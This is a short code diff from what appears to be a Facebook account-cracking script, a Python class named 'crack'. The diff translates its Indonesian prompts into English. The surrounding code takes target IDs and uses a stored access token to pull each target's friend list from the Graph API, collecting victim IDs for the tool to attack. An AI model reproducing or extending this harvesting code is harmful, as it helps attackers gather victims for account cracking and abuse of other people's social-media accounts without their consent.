@@ -246,14 +246,14 @@ class crack:
 			print("\nType 'me' To Dump From Friendlist")
 			for j in range(jumlah):
 				ha+=1
-				target=input(f"[+] Masukan ID Target Ke {ha}: ").replace("'me'","me")
+				target=input(f"[+] Enter Target Id {ha}: ").replace("'me'","me")
 				try:
 					rr=json.loads(req.get(f'https://graph.facebook.com/{target}?access_token={self.token}').text)
 					print(f"[=] Nama Target\t: {rr['name']}")
 					ro=json.loads(req.get(f'https://graph.facebook.com/{target}/friends?access_token={self.token}').text)
 					for x in ro['data']:
 						wok.append(x['id'])
-					print(f"[=] Jumlah ID\t: {len(wok)}")
+					print(f"[=] Amount ID\t: {len(wok)}")
 					wok.clear()
 				except KeyError:
 					print("Target Tidak Ada")
